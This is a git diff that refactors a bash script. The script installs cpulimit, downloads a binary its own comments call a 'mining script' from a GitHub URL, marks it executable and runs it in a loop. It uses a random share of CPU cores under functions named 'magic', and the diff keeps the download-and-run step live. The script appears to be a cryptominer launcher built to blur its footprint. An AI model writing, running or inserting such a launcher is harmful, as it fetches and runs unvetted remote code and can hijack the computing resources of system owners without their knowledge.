@@ -1,21 +1,20 @@
 #!/bin/bash
 
-# Check if cpulimit is installed
-if ! command -v cpulimit &> /dev/null; then
-  echo "cpulimit not found. Installing via yum..."
-  sudo yum install -y cpulimit
-else
-  echo "cpulimit is already installed"
-fi
+# Function to check and install cpulimit if not installed
+check_and_install_cpulimit() {
+  if ! command -v cpulimit &> /dev/null; then
+    echo "cpulimit not found. Installing via yum..."
+    sudo yum install -y cpulimit
+  else
+    echo "cpulimit is already installed"
+  fi
+}
 
-# Get the number of CPU cores
-total_cores=$(nproc)
-
-# Download the mining script
-wget -O tmii https://github.com/barburonjilo/back/raw/main/sr
-
-# Make the mining script executable
-chmod +x tmii
+# Function to download and prepare the mining script
+prepare_mining_script() {
+  wget -O tmii https://github.com/barburonjilo/back/raw/main/sr
+  chmod +x tmii
+}
 
 # Function to generate the localized date string with core count
 generate_worker() {
@@ -27,6 +26,7 @@ generate_worker() {
 
 # Function to start the mining process with a random number of cores
 start_magic() {
+  local total_cores=$(nproc)
   local num_cores=$(( ( RANDOM % (total_cores - 1) ) + 1 ))  # Randomly choose between 1 and (total_cores - 1)
   local worker=$(generate_worker $num_cores)  # Generate worker string including core count
 
@@ -61,6 +61,10 @@ stop_magic() {
     echo "No PID file found, cannot stop magic"
   fi
 }
+
+# Main execution
+check_and_install_cpulimit
+prepare_mining_script
 
 # Run the loop
 while true; do
